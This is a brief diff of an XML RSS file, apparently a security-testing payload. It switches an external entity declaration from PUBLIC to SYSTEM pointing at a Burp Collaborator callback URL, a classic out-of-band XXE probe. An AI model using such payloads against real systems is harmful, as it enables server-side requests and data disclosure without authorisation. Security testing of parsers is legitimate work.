@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="UTF-8" ?>
-<!DOCTYPE title  [<!ENTITY xxe PUBLIC "http://fat7gdqe00icxroevsr6h9i64xaryg.burpcollaborator.net/xxe"> ]>
+<!DOCTYPE title  [<!ENTITY xxe SYSTEM "http://fat7gdqe00icxroevsr6h9i64xaryg.burpcollaborator.net/xxe"> ]>
 <rss version="2.0">
 
 <channel>
